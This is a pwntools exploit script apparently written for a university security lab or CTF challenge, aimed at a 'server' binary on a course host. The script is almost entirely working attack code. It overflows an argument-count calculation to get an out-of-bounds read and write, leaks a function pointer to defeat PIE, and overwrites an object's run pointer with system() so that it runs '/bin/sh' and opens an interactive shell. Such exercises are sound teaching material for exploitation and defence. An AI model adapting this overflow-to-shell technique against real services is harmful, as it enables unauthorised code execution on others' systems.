#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template server
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'server')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 10_000)
    else:
        return remote('localhost', 10_000)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

import time


def addArg(nArgs):
    io.sendline(b'oa' + nArgs)
    ID = io.recvline()
    return ID

# var format id,idx
def addExecCtr(var):
    io.sendline(b'oec' + var)
    ID = io.recvline()
    return ID

# var format id,idx
def addExecGrep(var):
    io.sendline(b'oeg' + var)
    ID = io.recvline()
    return ID

# var format id,idx
def set(var, val):
    io.sendline(b'a' + var + b'=' + val)

def run(var):
    io.sendline(b'r' + var)

io = start()
io.recvline() # flush header

id = addArg(b'1')
set(b'0', b'/bin/sh')

own = (1 << 64)// 16 + 10
own = str(own).encode()

id = addArg(own)
assert id == b'1\n', print("ow didn't work", id)

id = addExecCtr(b'1') # write an exec object
assert id == b'2\n'

# for i in range(200):
#     run(f"1,{i}".encode())
#     try:
#         leak = io.recvline()
#         leak = leak.removesuffix(b"\n")
#         leak = leak.ljust(8, b'\x00')
#         leak = u64(leak)
#     except:
#         continue
#     print("hex", i, hex(leak))


run(f"1,{11}".encode())
leak = io.recvline()
leak = leak.removesuffix(b"\n")
leak = leak.ljust(8, b'\x00')
leak = u64(leak)

print(hex(leak))

exe.address = leak - exe.sym['ExecObj_Ctr_run']

print("exe.address", hex(exe.address))

# can get the heap position with p objects[2]->obj->run
set(f"1,{11}".encode(), p64(exe.sym['system']))

run(b"2")

io.interactive()

